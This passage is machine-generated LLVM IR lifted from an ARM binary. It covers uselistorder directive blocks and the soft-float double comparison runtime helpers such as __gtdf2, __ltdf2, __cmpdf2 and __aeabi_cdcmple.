  %v2_1f5fc = call i32 @function_1f3e4(i32 %v0_1f5fc, i32 %v1_1f5fc)
  store i32 %v2_1f5fc, i32* %r0.global-to-local, align 4
  ret i32 %v2_1f5fc

; uselistorder directives
  uselistorder i32 %v5_1f5e4, { 1, 0, 2 }
  uselistorder i32 %v1_1f5a0, { 1, 0 }
  uselistorder i32 %v1_1f580, { 1, 0 }
  uselistorder i32 %v0_1f580, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1f568, { 2, 0, 1 }
  uselistorder i32 %v6_1f564, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1f55c, { 1, 0 }
  uselistorder i32 %v2_1f544, { 1, 0, 2 }
  uselistorder i32 %v1_1f544, { 1, 0, 2 }
  uselistorder i32 %v1_1f540, { 1, 0, 2 }
  uselistorder i32 %v0_1f540, { 1, 0, 2 }
  uselistorder i1 %v7_1f534, { 1, 0 }
  uselistorder i32 %v2_1f518, { 1, 0 }
  uselistorder i32 %v3_1f504, { 2, 1, 0 }
  uselistorder i32 %v3_1f4f8, { 0, 2, 1 }
  uselistorder i32 %v5_1f4f4, { 2, 0, 1 }
  uselistorder i32 %v6_1f4e4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1f4d0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1f4cc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1f4d8, { 0, 2, 1 }
  uselistorder i32 %v1_1f4e4, { 1, 0 }
  uselistorder i32 %v6_1f4c8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1f4b4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1f4b0, { 0, 2, 1 }
  uselistorder i32 %v0_1f4bc, { 0, 2, 1 }
  uselistorder i32 %v1_1f4c8, { 1, 0 }
  uselistorder i32 %v6_1f4ac, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1f498, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1f4a0, { 0, 2, 1 }
  uselistorder i32 %v1_1f4ac, { 1, 0 }
  uselistorder i32 %v3_1f490, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1f484, { 1, 2, 0 }
  uselistorder i32 %v3_1f50413, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1f50017, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1f484, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1f490, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1f52c.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1f470, { 1, 0 }
  uselistorder i32 %v0_1f474, { 1, 0 }
  uselistorder i32 %v3_1f460, { 1, 0 }
  uselistorder i1 %v1_1f454, { 1, 0 }
  uselistorder i32 %v3_1f444, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1f440, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1f438, { 2, 1, 0 }
  uselistorder i32 %v5_1f434, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1f414, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1f404, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1f404, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1f400, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1f400, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1f3f4, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 8, 2, 3, 4, 5, 6, 9 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 8, 9, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_1f3e4, { 2, 1, 0 }
  uselistorder i32 ()* @function_1f250, { 1, 0 }
  uselistorder i32 1024, { 2, 0, 21, 18, 19, 20, 22, 3, 23, 1, 4, 13, 14, 15, 5, 6, 16, 7, 17, 8, 11, 10, 9, 12 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 7, 5, 6, 8, 9, 24, 10, 11, 2, 12, 13, 28, 88, 89, 96, 98, 14, 99, 15, 102, 103, 39, 104, 106, 120, 121, 122, 123, 16, 124, 125, 111, 112, 126, 127, 64, 65, 66, 67, 100, 101, 60, 61, 62, 63, 107, 108, 109, 110, 97, 3, 128, 129, 130, 131, 32, 33, 34, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 116, 117, 113, 114, 115, 90, 91, 132, 133, 134, 135, 136, 137, 138, 139, 143, 144, 145, 118, 17, 140, 35, 146, 92, 93, 40, 41, 94, 95, 68, 69, 70, 29, 105, 36, 71, 86, 72, 154, 155, 0, 156, 157, 119, 26, 147, 148, 149, 150, 151, 152, 56, 141, 142, 73, 18, 25, 19, 20, 4, 21, 22, 30, 42, 43, 74, 75, 76, 77, 78, 44, 79, 45, 80, 46, 81, 47, 48, 37, 49, 82, 50, 51, 83, 38, 57, 58, 52, 59, 84, 27, 31, 85, 87, 53, 153, 23, 54, 55 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 84, 85, 37, 6, 7, 24, 8, 132, 133, 140, 142, 143, 144, 145, 9, 146, 148, 149, 150, 151, 152, 38, 94, 69, 70, 86, 161, 162, 163, 164, 33, 174, 95, 96, 97, 98, 147, 153, 154, 155, 156, 157, 158, 159, 160, 141, 175, 176, 213, 262, 61, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 165, 166, 167, 168, 177, 178, 179, 180, 181, 182, 183, 184, 185, 10, 62, 186, 46, 187, 188, 87, 189, 190, 169, 35, 170, 171, 173, 191, 192, 193, 134, 135, 136, 137, 138, 139, 99, 100, 101, 102, 71, 280, 281, 39, 103, 11, 126, 129, 104, 105, 36, 214, 215, 216, 217, 218, 219, 220, 221, 12, 74, 222, 223, 224, 225, 226, 227, 228, 229, 13, 230, 231, 232, 233, 14, 234, 235, 15, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 253, 246, 247, 248, 249, 75, 26, 250, 251, 252, 76, 77, 16, 254, 255, 256, 257, 259, 260, 78, 17, 261, 18, 258, 172, 65, 66, 63, 64, 27, 28, 43, 44, 67, 282, 196, 197, 88, 198, 199, 200, 201, 34, 202, 79, 80, 203, 204, 205, 68, 206, 207, 208, 209, 29, 30, 210, 211, 212, 81, 194, 195, 106, 72, 89, 40, 19, 20, 25, 21, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 82, 31, 22, 117, 83, 32, 23, 118, 119, 120, 73, 121, 122, 123, 124, 125, 42, 60, 58, 59, 41, 57, 55, 56, 54, 52, 53, 51, 50, 48, 49, 90, 91, 92, 93, 47, 45, 127, 128, 130, 131 }
  uselistorder i32 4, { 5, 6, 205, 258, 259, 206, 7, 8, 260, 261, 262, 263, 264, 66, 265, 266, 274, 276, 277, 105, 278, 279, 280, 83, 281, 284, 138, 285, 286, 287, 288, 289, 290, 9, 291, 139, 106, 292, 140, 0, 1, 141, 295, 316, 317, 108, 107, 318, 142, 143, 144, 145, 319, 320, 110, 321, 109, 322, 85, 323, 324, 325, 308, 309, 218, 219, 282, 283, 213, 214, 215, 216, 217, 296, 297, 298, 299, 300, 301, 302, 303, 304, 10, 305, 306, 307, 275, 11, 326, 12, 327, 364, 267, 13, 14, 15, 244, 16, 17, 328, 18, 104, 99, 100, 19, 423, 101, 424, 88, 20, 21, 102, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 22, 442, 443, 444, 445, 446, 447, 87, 448, 449, 450, 451, 452, 453, 23, 24, 103, 454, 310, 111, 329, 330, 331, 332, 333, 334, 335, 336, 337, 84, 338, 339, 340, 341, 343, 312, 25, 313, 112, 314, 315, 342, 293, 294, 344, 146, 268, 269, 270, 271, 272, 273, 26, 220, 221, 222, 223, 27, 224, 455, 147, 113, 148, 456, 28, 457, 149, 211, 212, 367, 368, 369, 94, 370, 150, 29, 225, 151, 226, 152, 91, 227, 248, 153, 249, 250, 253, 254, 255, 256, 154, 155, 228, 156, 157, 229, 30, 230, 231, 86, 92, 373, 374, 375, 376, 377, 378, 158, 159, 31, 379, 380, 381, 382, 383, 384, 385, 386, 160, 371, 372, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 161, 162, 163, 401, 402, 405, 408, 403, 404, 114, 164, 406, 67, 407, 409, 410, 411, 413, 165, 33, 32, 412, 166, 167, 168, 365, 169, 363, 170, 311, 422, 34, 35, 36, 37, 2, 345, 38, 39, 171, 68, 40, 41, 172, 42, 173, 174, 175, 176, 346, 347, 43, 348, 177, 349, 350, 351, 116, 352, 353, 115, 178, 354, 355, 356, 357, 358, 359, 69, 179, 360, 362, 180, 181, 361, 207, 414, 415, 208, 44, 45, 70, 71, 72, 46, 47, 48, 73, 49, 50, 182, 51, 232, 233, 117, 234, 118, 235, 119, 236, 237, 238, 120, 239, 121, 240, 241, 74, 183, 122, 242, 123, 75, 184, 124, 89, 125, 243, 126, 76, 185, 127, 90, 245, 95, 246, 96, 247, 97, 98, 77, 52, 128, 186, 187, 188, 189, 190, 191, 192, 193, 131, 129, 209, 132, 53, 194, 130, 54, 210, 137, 55, 56, 93, 57, 58, 78, 195, 251, 252, 196, 257, 197, 79, 80, 59, 60, 61, 134, 133, 135, 81, 198, 136, 199, 82, 200, 201, 62, 366, 63, 64, 65, 416, 417, 418, 419, 420, 421, 202, 203, 204, 3, 4 }
  uselistorder i32 32, { 81, 82, 83, 84, 39, 40, 49, 68, 69, 42, 43, 85, 41, 50, 86, 87, 88, 89, 47, 90, 91, 93, 94, 105, 57, 70, 106, 95, 96, 71, 72, 73, 74, 99, 100, 92, 119, 51, 44, 103, 101, 102, 107, 58, 28, 108, 109, 104, 59, 122, 60, 61, 46, 62, 97, 98, 53, 52, 1, 2, 4, 3, 120, 6, 5, 8, 7, 10, 9, 45, 110, 111, 27, 112, 0, 63, 113, 114, 115, 116, 117, 118, 29, 75, 76, 121, 64, 65, 12, 11, 31, 14, 13, 30, 16, 15, 32, 48, 77, 78, 79, 18, 17, 33, 20, 19, 34, 54, 66, 80, 35, 22, 21, 24, 23, 36, 37, 26, 25, 38, 55, 56, 67 }
  uselistorder i32 33, { 5, 6, 7, 3, 8, 9, 10, 0, 2, 1, 4 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 88, 13, 14, 15, 16, 17, 18, 87, 93, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 86, 91, 57, 58, 59, 94, 60, 95, 61, 96, 62, 97, 92, 98, 63, 64, 66, 65, 67, 68, 69, 70, 0, 89, 1, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 85, 90, 84, 81, 82, 83 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 76, 77, 78, 79, 80, 81, 5, 82, 83, 84, 85, 101, 102, 103, 104, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 143, 144, 145, 146, 147, 148, 149, 161, 162, 163, 175, 176, 177, 178, 7, 6, 31, 32, 33, 34, 35, 36, 179, 180, 8, 181, 182, 183, 184, 185, 186, 187, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 105, 106, 107, 108, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 86, 9, 87, 88, 10, 164, 165, 166, 11, 167, 168, 202, 203, 204, 205, 12, 206, 207, 208, 209, 210, 211, 212, 169, 170, 13, 171, 172, 173, 174, 134, 135, 136, 137, 138, 139, 140, 141, 142, 89, 90, 91, 92, 14, 15, 93, 94, 95, 96, 97, 98, 99, 100, 37, 38, 39, 40, 41, 42, 43, 44, 16, 17, 18, 287, 288, 289, 290, 291, 292, 3, 293, 294, 26, 19, 27, 20, 28, 284, 285, 286, 45, 46, 47, 69, 70, 71, 72, 48, 49, 50, 51, 52, 53, 252, 256, 257, 258, 259, 253, 254, 255, 260, 261, 262, 263, 264, 21, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 280, 282, 276, 277, 278, 279, 281, 283, 62, 63, 4, 64, 25, 246, 247, 248, 249, 250, 251, 1, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 22, 24, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 2, 241, 242, 23, 29, 226, 0, 227, 228, 243, 244, 245, 54, 55, 65, 66, 67, 68, 56, 57, 58, 59, 60, 61, 73, 74, 75, 30 }
  uselistorder i32* @r5, { 130, 131, 132, 133, 134, 135, 136, 137, 138, 54, 55, 56, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 184, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 0, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 7, 225, 226, 227, 228, 229, 282, 237, 238, 239, 240, 241, 242, 243, 28, 244, 245, 246, 263, 299, 300, 8, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 9, 316, 315, 30, 317, 318, 319, 320, 321, 57, 58, 59, 60, 61, 62, 63, 322, 323, 324, 325, 326, 327, 332, 333, 328, 329, 330, 331, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 10, 344, 345, 64, 65, 66, 67, 68, 69, 70, 71, 72, 247, 248, 249, 11, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 185, 186, 187, 188, 189, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 283, 284, 285, 286, 445, 446, 447, 162, 33, 163, 4, 164, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 264, 265, 266, 267, 268, 272, 273, 274, 275, 276, 269, 270, 31, 271, 277, 278, 279, 280, 281, 165, 166, 167, 168, 358, 1, 359, 360, 361, 362, 363, 364, 287, 288, 293, 294, 295, 296, 12, 297, 298, 230, 231, 232, 233, 234, 13, 235, 236, 169, 16, 170, 171, 14, 172, 173, 174, 175, 176, 177, 15, 178, 179, 180, 181, 182, 183, 73, 17, 74, 75, 76, 77, 34, 78, 18, 79, 80, 81, 82, 83, 460, 19, 461, 462, 472, 43, 44, 45, 46, 47, 48, 49, 463, 464, 465, 466, 467, 84, 85, 86, 87, 88, 89, 90, 91, 92, 124, 125, 126, 93, 94, 95, 96, 20, 21, 468, 469, 470, 471, 97, 98, 99, 100, 413, 414, 418, 419, 420, 421, 422, 415, 416, 417, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 6, 436, 437, 438, 439, 440, 22, 441, 442, 443, 444, 113, 114, 115, 116, 117, 404, 405, 406, 407, 36, 408, 409, 23, 410, 411, 412, 289, 24, 290, 291, 292, 365, 25, 366, 35, 367, 368, 369, 370, 371, 372, 373, 374, 376, 375, 377, 378, 26, 379, 380, 381, 382, 383, 384, 385, 32, 386, 387, 391, 5, 392, 2, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 50, 51, 52, 388, 389, 390, 3, 27, 403, 102, 101, 29, 103, 104, 118, 119, 120, 121, 122, 123, 105, 106, 107, 108, 109, 110, 111, 112, 37, 38, 39, 40, 41, 42, 127, 128, 129, 53 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1f5e0, { 1, 0 }
  uselistorder label %dec_label_pc_1f5c4, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1f590, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1f480, { 1, 0 }
  uselistorder label %dec_label_pc_1f468, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1f604 = call i32 @function_1f614()
  ret i32 %v0_1f604
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1f60c = call i32 @function_1f614()
  ret i32 %v0_1f60c

; uselistorder directives
  uselistorder i32 ()* @function_1f614, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1f610 = load i32, i32* @r0, align 4
  ret i32 %v0_1f610
}

define i32 @function_1f614() local_unnamed_addr {
dec_label_pc_1f614:
  %v0_1f614 = load i32, i32* @ip, align 4
  %v0_1f618 = load i32, i32* @r1, align 4
  %v2_1f618 = mul i32 %v0_1f618, 2
  %v2_1f618.off = add i32 %v2_1f618, 4194303
  %tmp = icmp ult i32 %v2_1f618.off, 2097152
  %v0_1f620 = load i32, i32* @r3, align 4
  %v2_1f620 = mul i32 %v0_1f620, 2
  br i1 %tmp, label %dec_label_pc_1f670, label %bb

bb:                                               ; preds = %dec_label_pc_1f614
  %v2_1f620.off = add i32 %v2_1f620, 4194303
  %tmp21 = icmp ult i32 %v2_1f620.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1f664, label %dec_label_pc_1f62c

dec_label_pc_1f62c:                               ; preds = %dec_label_pc_1f678, %dec_label_pc_1f684, %bb
  %v0_1f62c = load i32, i32* @r0, align 4
  %v4_1f62c = or i32 %v0_1f62c, %v2_1f618
  %v6_1f62c = icmp eq i32 %v4_1f62c, 0
  br i1 %v6_1f62c, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1f62c
  %v1_1f630 = load i32, i32* @r2, align 4
  %v5_1f630 = or i32 %v1_1f630, %v2_1f620
  %v7_1f630 = icmp eq i32 %v5_1f630, 0
  br i1 %v7_1f630, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1f62c, %bb10
  %v5_1f634 = icmp eq i32 %v0_1f620, %v0_1f618
  br i1 %v5_1f634, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1f638.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1f638 = phi i32 [ %v2_1f638.pre, %.thread..thread1_crit_edge ], [ %v1_1f630, %bb10 ]
  %v5_1f638 = icmp eq i32 %v2_1f638, %v0_1f62c
  br i1 %v5_1f638, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1f640 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1f640 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1f640, i32 %v0_1f640)
  %v0_1f644 = load i32, i32* @r0, align 4
  %v0_1f648 = load i32, i32* @r1, align 4
  %v1_1f648 = load i32, i32* @r3, align 4
  %v2_1f648 = xor i32 %v1_1f648, %v0_1f648
  %v3_1f648 = icmp slt i32 %v2_1f648, 0
  br i1 %v3_1f648, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1f64c = icmp eq i32 %v0_1f648, %v1_1f648
  br i1 %v10_1f64c, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1f650 = load i32, i32* @r2, align 4
  %v4_1f650 = icmp ult i32 %v0_1f644, %v2_1f650
  br i1 %v4_1f650, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1f64c = icmp ult i32 %v0_1f648, %v1_1f648
  br i1 %v4_1f64c, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1f648, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1f654 = and i32 %v1_1f648, 1073741824
  %v3_1f654 = icmp eq i32 %v2_1f654, 0
  %v4_1f654 = ashr i32 %v1_1f648, 31
  br i1 %v3_1f654, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1f658.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1f654, %bb15 ]
  %v5_1f658 = sub nsw i32 -1, %v4_1f658.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1f65c = phi i32 [ %v4_1f654, %bb15 ], [ %v5_1f658, %.thread3 ]
  %v1_1f65c = or i32 %v0_1f65c, 1
  ret i32 %v1_1f65c

dec_label_pc_1f664:                               ; preds = %bb
  br label %dec_label_pc_1f678

dec_label_pc_1f670:                               ; preds = %dec_label_pc_1f614
  %v0_1f670 = load i32, i32* @r0, align 4
  %v4_1f670 = mul i32 %v0_1f618, 4096
  %v5_1f670 = or i32 %v0_1f670, %v4_1f670
  %v7_1f670 = icmp eq i32 %v5_1f670, 0
  br i1 %v7_1f670, label %dec_label_pc_1f670.dec_label_pc_1f678_crit_edge, label %dec_label_pc_1f68c

dec_label_pc_1f670.dec_label_pc_1f678_crit_edge:  ; preds = %dec_label_pc_1f670
  %v2_1f620.off20 = add i32 %v2_1f620, 4194303
  %tmp22 = icmp ult i32 %v2_1f620.off20, 2097152
  br label %dec_label_pc_1f678

dec_label_pc_1f678:                               ; preds = %dec_label_pc_1f670.dec_label_pc_1f678_crit_edge, %dec_label_pc_1f664
  %v3_1f67c.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1f670.dec_label_pc_1f678_crit_edge ], [ true, %dec_label_pc_1f664 ]
  br i1 %v3_1f67c.pre-phi, label %dec_label_pc_1f684, label %dec_label_pc_1f62c

dec_label_pc_1f684:                               ; preds = %dec_label_pc_1f678
  %v0_1f684 = load i32, i32* @r2, align 4
  %v4_1f684 = mul i32 %v0_1f620, 4096
  %v5_1f684 = or i32 %v0_1f684, %v4_1f684
  %v7_1f684 = icmp eq i32 %v5_1f684, 0
  br i1 %v7_1f684, label %dec_label_pc_1f62c, label %dec_label_pc_1f68c

dec_label_pc_1f68c:                               ; preds = %dec_label_pc_1f670, %dec_label_pc_1f684
  ret i32 %v0_1f614

; uselistorder directives
  uselistorder i32 %v4_1f654, { 1, 0 }
  uselistorder i32 %v1_1f648, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1f648, { 2, 1, 0 }
  uselistorder i32 %v1_1f630, { 1, 0 }
  uselistorder i32 %v2_1f620, { 0, 2, 1 }
  uselistorder i32 %v0_1f620, { 1, 0, 2 }
  uselistorder i32 %v2_1f618, { 1, 0 }
  uselistorder i32 %v0_1f618, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 11, 4, 2, 5, 6, 12, 3, 13, 14, 7, 8, 1, 15, 0, 16, 17, 18, 19, 9, 10 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 7, 5, 6, 8, 9, 10, 11, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 52, 53, 54, 55, 12, 14, 64, 50, 49, 51, 56, 46, 47, 48, 40, 69, 74, 72, 73, 71, 65, 66, 0, 15, 16, 67, 68, 70, 61, 62, 58, 1, 59, 57, 13, 60, 63, 2, 3, 4 }
  uselistorder i32* @r3, { 43, 44, 16, 17, 45, 46, 7, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 2, 83, 6, 18, 20, 21, 61, 85, 86, 112, 113, 3, 114, 115, 116, 4, 117, 118, 119, 5, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 0, 138, 139, 140, 141, 87, 88, 89, 90, 91, 92, 93, 66, 68, 69, 70, 71, 94, 95, 96, 97, 19, 142, 148, 149, 150, 146, 59, 60, 105, 106, 102, 62, 98, 99, 107, 108, 109, 110, 111, 9, 10, 11, 154, 151, 152, 153, 1, 155, 156, 157, 100, 101, 67, 22, 35, 36, 33, 147, 63, 64, 65, 143, 144, 145, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 12, 13, 14, 15, 37, 38, 39, 40, 41, 42, 8, 103, 104 }
  uselistorder i32* @r1, { 79, 80, 11, 81, 82, 83, 84, 85, 12, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 27, 28, 13, 29, 30, 97, 1, 98, 99, 100, 101, 102, 103, 104, 10, 105, 106, 107, 108, 109, 14, 110, 111, 112, 115, 15, 17, 116, 117, 118, 119, 120, 121, 124, 125, 126, 127, 128, 131, 139, 140, 141, 142, 143, 144, 145, 7, 31, 32, 146, 147, 132, 148, 33, 35, 129, 130, 2, 149, 150, 156, 157, 113, 63, 133, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 138, 179, 18, 114, 0, 34, 36, 20, 26, 192, 122, 123, 3, 4, 188, 74, 21, 180, 181, 183, 182, 134, 135, 136, 169, 170, 171, 22, 23, 151, 152, 153, 154, 155, 5, 185, 186, 8, 16, 6, 172, 173, 174, 9, 175, 176, 177, 24, 178, 137, 75, 76, 19, 190, 191, 25, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 77, 78, 184, 187, 189 }
  uselistorder i32* @ip, { 27, 18, 19, 20, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55, 63, 1, 71, 70, 15, 80, 81, 82, 83, 84, 85, 86, 87, 88, 90, 91, 89, 92, 9, 93, 10, 94, 95, 96, 97, 98, 99, 2, 100, 21, 64, 65, 66, 67, 68, 69, 47, 101, 102, 103, 117, 42, 43, 14, 119, 118, 5, 120, 121, 6, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 11, 188, 189, 190, 191, 192, 193, 194, 195, 196, 72, 73, 3, 74, 44, 122, 123, 75, 76, 79, 124, 125, 126, 16, 197, 56, 57, 4, 58, 59, 60, 61, 62, 151, 12, 152, 153, 148, 149, 13, 150, 77, 78, 127, 154, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 129, 128, 7, 201, 198, 199, 200, 8, 202, 131, 132, 133, 134, 135, 136, 137, 138, 130, 139, 140, 141, 142, 143, 144, 145, 146, 0, 147, 22, 26, 23, 24, 25, 17 }
  uselistorder label %dec_label_pc_1f68c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1f62c, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1f694 = load i32, i32* @r0, align 4
  %v0_1f698 = load i32, i32* @r2, align 4
  store i32 %v0_1f698, i32* @r0, align 4
  store i32 %v0_1f694, i32* @r2, align 4
  %v0_1f6ac = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1f6ac
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1f6b0 = load i32, i32* @r0, align 4
  %v1_1f6b4 = sext i32 %v3_1f6b0 to i64
